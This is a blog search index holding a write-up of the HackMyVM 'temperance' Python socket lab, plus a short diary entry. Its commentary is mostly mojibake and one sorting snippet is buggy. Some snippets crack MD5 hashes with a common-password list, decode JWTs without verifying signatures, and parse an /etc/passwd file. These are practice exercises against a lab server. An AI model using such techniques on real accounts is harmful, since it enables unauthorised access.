<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HMVlabs-temperance</title>
    <url>/2024/06/03/HMVlabs-temperance/</url>
    <content><![CDATA[<h4 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h4><p>å‰æ®µæ—¶é—´å°±æƒ³ç€è¦å¥½å¥½æŠŠpythonç»ƒä¸€ç»ƒï¼Œåˆšå¥½æœ€è¿‘hmvæ–°å‡ºäº†ä¸€ä¸ªlabsï¼Œå…¶å®ä¸æ˜¯å¾ˆéš¾ï¼Œä½†æˆ‘è¿˜æ˜¯è¦gptå¸®åŠ©ï¼Œç®—æ˜¯æŠŠä¸€äº›è¯­æ³•å·©å›ºäº†ä¸€ä¸‹ï¼Œæ˜¨æ™šè¿˜æ˜¯è§‰å¾—è¦è®°ä¸€ä¸‹ï¼Œä¸ç„¶åšå®Œäº†ä¸å›é¡¾å…¶å®æ²¡ä»€ä¹ˆå¢é•¿ã€‚</p>
<h4 id="levelx00"><a href="#levelx00" class="headerlink" title="levelx00"></a>levelx00</h4><p>ä¸€å¼€å§‹è¿˜èŠ±äº†ç‚¹æ—¶é—´ç†è§£è¿™ä¸ªlabè¦æ€ä¹ˆæ‰“ï¼Œç¬¬ä¸€å…³å°±æ˜¯å¸¦å…¥é—¨ï¼Œå…ˆçœ‹çœ‹æ•´ä½“ä»£ç é€»è¾‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;temperance.hackmyvm.eu&quot;</span></span><br><span class="line">PORT = <span class="number">9988</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s: <span class="comment"># å»ºç«‹sockerè¿æ¥</span></span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Receiving Intro&#x27;</span>)	<span class="comment"># æ¥æ”¶ä¿¡æ¯</span></span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">b&#x27;levelx00&#x27;</span>) <span class="comment"># å‘ç”Ÿé€‰æ‹©çš„å…³å¡ï¼Œåç»­éƒ½æ˜¯é€šè¿‡è¿™ä¸ªæ§åˆ¶å…³å¡</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Receiving challenge.&#x27;</span>)</span><br><span class="line">    data2 = s.recv(<span class="number">1024</span>) <span class="comment"># æ¥æ”¶æ•°æ®ï¼Œåç»­åšä¸€äº›å¤„ç†</span></span><br><span class="line">    <span class="built_in">print</span>(data2)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">    s.send(data2)	<span class="comment"># å¤„ç†åå†å‘è¿‡å»</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Recibo flag&#x27;</span>)</span><br><span class="line">    data3 = s.recv(<span class="number">1024</span>) <span class="comment"># å¦‚æœæ˜¯å¯¹æ–¹æœŸæœ›çš„æ•°æ®ï¼Œä¼šè¿”å›flagï¼Œç”¨recvæ¥æ”¶</span></span><br><span class="line">    <span class="built_in">print</span>(data3)</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯è¿™æ ·æ‰§è¡Œè¿™ä¸ªä»£ç ï¼Œå°±èƒ½è·å¾—ç¬¬ä¸€å…³çš„flagï¼Œåç»­æ¯ä¸€å…³éƒ½æœ‰æ–°çš„è¦æ±‚ï¼Œæ¥æ”¶æ•°æ®ï¼Œå¯¹æ•°æ®è¿›è¡Œå¤„ç†ç„¶åå‘å›å»</p>
<p>å‰å‡ å…³éƒ½å¤ªç®€å•äº†ï¼Œæˆ‘ç›´æ¥è®°å½•ä¸€äº›æˆ‘è§‰å¾—æ¯”è¾ƒå¯è¯´çš„</p>
<h4 id="levelx06"><a href="#levelx06" class="headerlink" title="levelx06"></a>levelx06</h4><p>â€œIn this mission you will receive a string and you must return its length. (as string, not as int).â€</p>
<p>æ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ³¨æ„è¿™ä¸ªå…³å¡æ¥å—çš„æ•°æ®éƒ½æ˜¯byteå‹ï¼Œè¿›è¡Œä¸€äº›å­—ç¬¦å¤„ç†è¿˜è¦è½¬æ¢æˆstr</p>
<p>ç»å†äº†è¿™ä¸ªï¼Œæˆ‘æ›´æ¸…æ™°äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å­—ç¬¦-&gt;bytes:data.encode()</span><br><span class="line">bytes-&gt;å­—ç¬¦:string.decode()</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥06å‘é€å›å»çš„æ•°æ®åº”è¯¥æ˜¯ï¼Œè¦è½¬æˆbyteså‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.send((<span class="built_in">str</span>(<span class="built_in">len</span>(data2))).encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx08"><a href="#levelx08" class="headerlink" title="levelx08"></a>levelx08</h4><p>â€œIn this mission you will receive 2 numbers, you must return the result of adding both.â€</p>
<p>æ¥æ”¶ä¸€ä¸ªä¸¤ä¸ªæ•°å­—ï¼Œè¿”å›ç›¸åŠ çš„ç»“æœï¼Œå€ŸåŠ©splitåˆ†å‰²å‡ºæ¥ï¼Œåˆ—è¡¨é‡Œé¢æ˜¯byteså‹ï¼Œç„¶åå¼ºåˆ¶è½¬æ¢æˆintå‹ï¼Œs.sendä¸èƒ½å‘intå‹è¦å…ˆè½¬æˆstrå†è½¬æˆbyteså‹ï¼Œä¸èƒ½to_bytes()ï¼Œæˆ‘å‘ç°ä¼šè‡ªåŠ¨å˜æˆascii</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = s.recv(<span class="number">1024</span>)</span><br><span class="line">  <span class="built_in">print</span>(data2)</span><br><span class="line"></span><br><span class="line">  numbers=data2.split()</span><br><span class="line">  <span class="built_in">print</span>(numbers)</span><br><span class="line">  result=(<span class="built_in">int</span>(numbers[<span class="number">0</span>]) + <span class="built_in">int</span>(numbers[<span class="number">1</span>]))</span><br><span class="line">  <span class="comment"># Send the challenge solved / Envia el resultado del challenge.</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">  s.send(<span class="built_in">str</span>(result).encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx09"><a href="#levelx09" class="headerlink" title="levelx09"></a>levelx09</h4><p>rot13è§£å¯†ï¼Œç›´æ¥æ‰¾å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rot13</span>(<span class="params">i</span>):</span><br><span class="line">    cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> i.isupper():</span><br><span class="line">        <span class="keyword">if</span> <span class="number">90</span> &gt;= <span class="built_in">ord</span>(i) + <span class="number">13</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) + <span class="number">13</span> - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">13</span> - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">elif</span> i.islower():</span><br><span class="line">        <span class="keyword">if</span> <span class="number">122</span> &gt;= <span class="built_in">ord</span>(i) + <span class="number">13</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) + <span class="number">13</span> - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">13</span> - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cipher += i</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br></pre></td></tr></table></figure>

<h4 id="levelx10"><a href="#levelx10" class="headerlink" title="levelx10"></a>levelx10</h4><p>â€œIn this mission you will receive numbers separated by spaces, you must return them in order from  smallest to largest and without separating them with spaces. â€œ</p>
<p>æ¥æ”¶ï¼š80 37 67 41 31 è¦è¿”å›ï¼š3137416780</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment"># è½¬str</span></span><br><span class="line">  nums = data2.split() <span class="comment"># æŒ‰ç©ºæ ¼åˆ†å‰²</span></span><br><span class="line">  int_list = [<span class="built_in">int</span>(item) <span class="keyword">for</span> item <span class="keyword">in</span> nums] <span class="comment"># åˆ—è¡¨æ¯ä¸ªå…ƒç´ éƒ½è½¬æˆint</span></span><br><span class="line">  sorted_list = <span class="built_in">sorted</span>(nums) <span class="comment"># æ’åº</span></span><br><span class="line">  data3 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> sorted_list: <span class="comment"># æ‹¼æ¥èµ·æ¥</span></span><br><span class="line">      data3 += i</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">  s.send(data3.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h4 id="levelx13"><a href="#levelx13" class="headerlink" title="levelx13"></a>levelx13</h4><p>â€œIn this mission you receive a list of strings, you must sort them alphabetically and return the last string in the list. The characters â€œ[â€œ and â€œ]â€ must be removed.â€</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240603105035.png" ></p>
<p>å°±æ˜¯ç»™å¾ˆå¤šå­—ç¬¦ä¸²æ’åº</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">data2 = data2[<span class="number">1</span>:-<span class="number">1</span>] <span class="comment"># å»é™¤å‰å[]</span></span><br><span class="line">ss = data2.split() </span><br><span class="line">ss = <span class="built_in">sorted</span>(ss) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">s.send(ss[-<span class="number">1</span>].encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h4 id="levelx17"><a href="#levelx17" class="headerlink" title="levelx17"></a>levelx17</h4><p>â€œ In this mission you receive a 1 pixel png encoded in base64, you must decode it and return the last RGBA value.â€</p>
<p>ç”Ÿæˆä¸€å¼ å›¾ç‰‡ç„¶åè¦æ‰¾å‡ºé‡Œé¢æœ€åä¸€ä¸ªRGBAæ•°æ®ï¼Œè¿™ä¸ªå°±è¦ç”¨åˆ°ç‰¹å®šçš„åº“</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> imagesize  <span class="comment"># éœ€è¦ç”¨åˆ°è¿™ä¸‰ä¸ªåº“</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image </span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"> ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line">		data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded_data = base64.b64decode(data2)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(BytesIO(decoded_data)) <span class="comment"># å°†è§£ç åçš„æ•°æ®è½¬æ¢ä¸ºå›¾åƒ</span></span><br><span class="line">    rgba_data = image.convert(<span class="string">&quot;RGBA&quot;</span>).getdata() <span class="comment"># ç”¨åº“é‡Œçš„å‡½æ•°æå–å‡ºRGBAæ•°æ®</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send the challenge solved / Envia el resultado del challenge.</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">    s.send(<span class="built_in">str</span>(rgba_data[-<span class="number">1</span>][-<span class="number">1</span>]).encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx19"><a href="#levelx19" class="headerlink" title="levelx19"></a>levelx19</h4><p>æ¥æ”¶ä¸€æ®µæ•°æ®ï¼Œbase64è§£å¯†ï¼Œå†™å…¥ä¸€ä¸ªæ–°å»ºçš„zipï¼Œè§£å‹è¯»å–é‡Œé¢HMV.txtçš„å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line">    data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data2 = base64.b64decode(data2)</span><br><span class="line">    zip_filename = <span class="string">&quot;decoded_archive.zip&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(zip_filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> zip_file: <span class="comment"># æŠŠè§£ç åçš„å†…å®¹æ–°å»ºä¸€ä¸ªzipå†™å…¥</span></span><br><span class="line">        zip_file.write(data2)</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref: </span><br><span class="line">        txt_filename = <span class="string">&quot;HMV.txt&quot;</span></span><br><span class="line">        <span class="keyword">with</span> zip_ref.<span class="built_in">open</span>(txt_filename) <span class="keyword">as</span> txt_file: <span class="comment"># è¯»å–txtå†…å®¹</span></span><br><span class="line">            txt_content = txt_file.read()</span><br><span class="line">            <span class="built_in">print</span>(txt_content)</span><br></pre></td></tr></table></figure>

<h4 id="levelx20"><a href="#levelx20" class="headerlink" title="levelx20"></a>levelx20</h4><p>rockyouå‰äº”åä¸ªè¯ä½œä¸ºå­—å…¸ï¼Œæ¥æ”¶ä¸€ä¸ªmd5ï¼Œå»çˆ†ç ´æ‰¾å‡ºåŸæ–‡æ˜¯å­—å…¸ä¸­çš„å“ªä¸€ä¸ª</p>
<p>å‘½ä»¤è¡Œè¯»å–txtæ–‡ä»¶å‰äº”åè¡Œæ•°æ®ï¼Œ<em>head -n 50 rockuou.txt</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">common_passwords = [</span><br><span class="line">    <span class="string">&quot;123456&quot;</span>,<span class="string">&quot;12345&quot;</span>,<span class="string">&quot;123456789&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="string">&quot;iloveyou&quot;</span>,<span class="string">&quot;princess&quot;</span>,<span class="string">&quot;1234567&quot;</span>,<span class="string">&quot;rockyou&quot;</span>,</span><br><span class="line">    <span class="string">&quot;12345678&quot;</span>,<span class="string">&quot;abc123&quot;</span>,<span class="string">&quot;nicole&quot;</span>,<span class="string">&quot;daniel&quot;</span>,<span class="string">&quot;babygirl&quot;</span>,<span class="string">&quot;monkey&quot;</span>,<span class="string">&quot;lovely&quot;</span>,<span class="string">&quot;jessica&quot;</span>,<span class="string">&quot;654321&quot;</span>,<span class="string">&quot;michael&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ashley&quot;</span>,<span class="string">&quot;qwerty&quot;</span>,<span class="string">&quot;111111&quot;</span>,<span class="string">&quot;iloveu&quot;</span>,<span class="string">&quot;000000&quot;</span>,<span class="string">&quot;michelle&quot;</span>,<span class="string">&quot;tigger&quot;</span>,<span class="string">&quot;sunshine&quot;</span>,<span class="string">&quot;chocolate&quot;</span>,<span class="string">&quot;password1&quot;</span>,</span><br><span class="line">   <span class="string">&quot;soccer&quot;</span>,<span class="string">&quot;anthony&quot;</span>,<span class="string">&quot;friends&quot;</span>,<span class="string">&quot;butterfly&quot;</span>,<span class="string">&quot;purple&quot;</span>,<span class="string">&quot;angel&quot;</span>,<span class="string">&quot;jordan&quot;</span>,<span class="string">&quot;liverpool&quot;</span>,<span class="string">&quot;justin&quot;</span>,<span class="string">&quot;loveme&quot;</span>,<span class="string">&quot;fuckyou&quot;</span>,</span><br><span class="line">    <span class="string">&quot;123123&quot;</span>,<span class="string">&quot;football&quot;</span>,<span class="string">&quot;secret&quot;</span>,<span class="string">&quot;andrea&quot;</span>,<span class="string">&quot;carlos&quot;</span>,<span class="string">&quot;jennifer&quot;</span>,<span class="string">&quot;joshua&quot;</span>,<span class="string">&quot;bubbles&quot;</span>,<span class="string">&quot;1234567890&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;hannah&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash1</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(text.encode()).hexdigest() <span class="comment"># ç”Ÿæˆmd5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_md5</span>(<span class="params">md5_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> common_passwords:</span><br><span class="line">        <span class="keyword">if</span> md5_hash == md5_hash1(password): <span class="comment"># ä¸€ä¸ªä¸€ä¸ªå»å¯¹æ¯”ï¼Œæ‰¾åˆ°äº†å°±è¿”å›</span></span><br><span class="line">            <span class="keyword">return</span> password</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line"></span><br><span class="line">		data2 = crack_md5(data2)</span><br><span class="line">  	s.send(data2.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h4 id="levelx25"><a href="#levelx25" class="headerlink" title="levelx25"></a>levelx25</h4><p>æ¥æ”¶åˆ°æ•°æ®æ˜¯ä¸ªurlï¼Œå‘é€è¯·æ±‚ç„¶åè¯»å–è¿”å›åŒ…çš„header</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  response = requests.get(data2)</span><br><span class="line">  header = response.headers.get(<span class="string">&#x27;Hmv-Code&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="levelx26"><a href="#levelx26" class="headerlink" title="levelx26"></a>levelx26</h4><p>ç”Ÿæˆä¸€å¼ å›¾ç‰‡ï¼Œè¦è¯†åˆ«å‡ºé‡Œé¢çš„å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line">    data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded_data = base64.b64decode(data2)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(BytesIO(decoded_data))</span><br><span class="line">    image.save(<span class="string">&quot;decoded_image.png&quot;</span>)</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;decoded_image.png&quot;</span>)</span><br><span class="line">    text = pytesseract.image_to_string(img) <span class="comment"># ä¸»è¦æ˜¯ç”¨è¿™ä¸ªåº“ï¼Œä½†æ˜¯æœ‰æ—¶å€™ä¸æ˜¯å¾ˆå‡†ç¡®</span></span><br></pre></td></tr></table></figure>

<h4 id="levelx27"><a href="#levelx27" class="headerlink" title="levelx27"></a>levelx27</h4><p>æ¥æ”¶åˆ°æ•°æ®æ˜¯ä¸ªurlï¼Œå‘é€è¯·æ±‚ç„¶åè¿”å›çš„æ˜¯&#x2F;etc&#x2F;passwdçš„å†…å®¹ï¼Œè¦æå–é‡Œé¢ç”¨æˆ·proxyçš„uid</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">response = requests.get(data2)</span><br><span class="line">html_content = response.text</span><br><span class="line">ll = html_content.split(<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># æŒ‰æ¢è¡Œåˆ†å‰²</span></span><br><span class="line">pp = ll[-<span class="number">3</span>].split(<span class="string">&#x27;:&#x27;</span>) <span class="comment"># å†æŒ‰ï¼šåˆ†å‰²</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">s.send(<span class="built_in">str</span>(pp[<span class="number">2</span>]).encode()) å‘é€ç¬¬ä¸‰ä¸ªå­—æ®µä¹Ÿå°±æ˜¯UID</span><br></pre></td></tr></table></figure>

<h4 id="levelx28"><a href="#levelx28" class="headerlink" title="levelx28"></a>levelx28</h4><p>jwtè§£å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract_hmv_key</span>(<span class="params">token</span>):</span><br><span class="line">    decoded_token = jwt.decode(token, options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    hmv_key = decoded_token.get(<span class="string">&#x27;HMVKey&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> hmv_key</span><br></pre></td></tr></table></figure>

<h4 id="levelx29"><a href="#levelx29" class="headerlink" title="levelx29"></a>levelx29</h4><p>å‘é€ä¸¤ä¸ªåæ ‡è®¡ç®—ä»–ä»¬ä¹‹é—´çš„è·ç¦»ï¼Œè¿™ä¸ªè¦ç”¨åˆ°ç‰¹å®šçš„åº“ï¼ˆåœ¨æ­¤ç”¨umzçš„ä»£ç ï¼‰</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240603112230.png" ></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> geopy.distance <span class="keyword">import</span> geodesic</span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line">		pattern = <span class="string">r&quot;Lat: (\d+) Lon: (\d+) - Lat: (\d+) Lon: (\d+)&quot;</span></span><br><span class="line">    matches = re.<span class="keyword">match</span>(pattern, data2)</span><br><span class="line">    <span class="keyword">if</span> matches:</span><br><span class="line">        coord1 = (<span class="built_in">int</span>(matches.group(<span class="number">1</span>)), <span class="built_in">int</span>(matches.group(<span class="number">2</span>)))</span><br><span class="line">        coord2 = (<span class="built_in">int</span>(matches.group(<span class="number">3</span>)), <span class="built_in">int</span>(matches.group(<span class="number">4</span>)))</span><br><span class="line">    distance = geodesic(coord1, coord2).kilometers</span><br><span class="line">    formatted_distance = <span class="string">&quot;&#123;:.3f&#125;&quot;</span>.<span class="built_in">format</span>(distance)</span><br><span class="line">    s.send(formatted_distance.encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx31"><a href="#levelx31" class="headerlink" title="levelx31"></a>levelx31</h4><p>è¦è¯†åˆ«äºŒç»´ç ï¼Œä¹Ÿæ˜¯ç”¨åˆ°ç‰¹å®šçš„åº“</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_qr_code</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="comment"># æ‰“å¼€å›¾ç‰‡</span></span><br><span class="line">    image = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    <span class="comment"># è§£ç å›¾ç‰‡ä¸­çš„äºŒç»´ç </span></span><br><span class="line">    decoded_objects = decode(image)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¾“å‡ºè§£ç ç»“æœ</span></span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> decoded_objects:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Type:&#x27;</span>, obj.<span class="built_in">type</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Data:&#x27;</span>, obj.data)</span><br><span class="line">        <span class="keyword">return</span> obj.data</span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line">		data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded_data = base64.b64decode(data2)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(BytesIO(decoded_data))</span><br><span class="line">    image.save(<span class="string">&quot;qr.png&quot;</span>)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(<span class="string">&quot;qr.png&quot;</span>)</span><br><span class="line">    img_path = <span class="string">&#x27;qr.png&#x27;</span></span><br><span class="line">    image.save(img_path)</span><br><span class="line"></span><br><span class="line">    data2 = scan_qr_code(img_path) <span class="comment"># æ‰«ç </span></span><br></pre></td></tr></table></figure>

<h4 id="levelx32"><a href="#levelx32" class="headerlink" title="levelx32"></a>levelx32</h4><p>â€œIn this mission you receive an md5 and a string. You must permute the string until it matches md5 and return the string.â€</p>
<p>æœ‰ä¸€ä¸ªmd5ï¼Œå’Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‡æ–°æ’åºå­—ç¬¦ä¸²ï¼Œæ‰¾å‡ºé‚£ä¸ªmd5çš„åŸæ–‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br><span class="line">		data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    md = data2.split()[<span class="number">0</span>]</span><br><span class="line">    key = data2.split()[<span class="number">1</span>]</span><br><span class="line">    permutations = itertools.permutations(key)</span><br><span class="line">    <span class="keyword">for</span> perm <span class="keyword">in</span> permutations:</span><br><span class="line">        perm_str = <span class="string">&#x27;&#x27;</span>.join(perm)</span><br><span class="line">        perm_md5 = hashlib.md5(perm_str.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> perm_md5 == md:</span><br><span class="line">            data2 = perm_str</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h4 id="å†™å®Œäº†"><a href="#å†™å®Œäº†" class="headerlink" title="å†™å®Œäº†"></a>å†™å®Œäº†</h4><p>aiå¤ªç‰›äº†ï¼Œä¸€ç‚¹ä¸€ç‚¹è°ƒï¼ŒåŠ æ·±å¯¹çŸ¥è¯†çš„å°è±¡ï¼Œä½†æ˜¯å†™å®Œè¿™ä¸ªæ„Ÿè§‰è‡ªå·±è ¢è ¢çš„ã€‚ã€‚ã€‚</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>å¤ç›˜</tag>
      </tags>
  </entry>
  <entry>
    <title>9.4å›æ ¡å°è®°</title>
    <url>/2024/09/04/9-4%E5%9B%9E%E6%A0%A1%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>éšä¾¿è¯´ç‚¹ï¼Œç»“æŸäº†hwï¼Œåœ¨åŒ—äº¬å¤šå‘†äº†å››å¤©ï¼Œå››å¤„é€›é€›ï¼Œä»Šå¤©å›åˆ°å­¦æ ¡ï¼Œå¼€å§‹åç‰¢ç”Ÿæ´»</p>
<p>å›åˆ°å®¿èˆï¼Œå‘ç°æœ‰çš„å®¤å‹æŠ¥åäº†æ•™èµ„  Â ï¼Œæœ‰çš„å®¤å‹åœ¨å¼€å§‹å‡†å¤‡é›…æ€ï¼ŒçœŸçš„æœ‰å¤§ä¸‰çš„å®æ„Ÿäº†ï¼Œå¤§å®¶åœ¨å¼€å§‹èµ°å¾€ä¸åŒçš„æ–¹å‘</p>
<p>è¨€å½’æ­£ä¼ ï¼Œæ–°å­¦æœŸæ–°æ°”è±¡ï¼Œè¿˜è¦ç£¨ç»ƒæŠ€æœ¯ï¼Œè¿™æ®µæ—¶é—´çœŸçš„è®¤è¯†åˆ°å¥½å¤šåŒé¾„ä½†æ˜¯å‰å®³å¾ˆå¤šçš„å¸ˆå‚…ï¼Œè‡ªå·±ç¦»ä»–ä»¬è¿˜æœ‰ä¸€å¤§æˆªï¼Œè¿™ç¯‡åšå®¢ç®€å•è®°å½•ï¼Œå…¬å¼€å‡ºæ¥ï¼ˆè™½ç„¶ä¸çŸ¥é“æœ‰å¤šå°‘äººä¼šçœ‹åˆ°ï¼‰è­¦é†’è‡ªå·±ä¸èƒ½å†æ‡’æ•£äº†â€¦</p>
]]></content>
      <tags>
        <tag>æ‚</tag>
        <tag>ç”Ÿæ´»è®°å½•</tag>
      </tags>
  </entry>
  <entry>
    <title>7.28æ·±å¤œå°è®°</title>
    <url>/2024/07/28/7-28%E6%B7%B1%E5%A4%9C%E5%B0%8F%E8%AE%B0/</url>
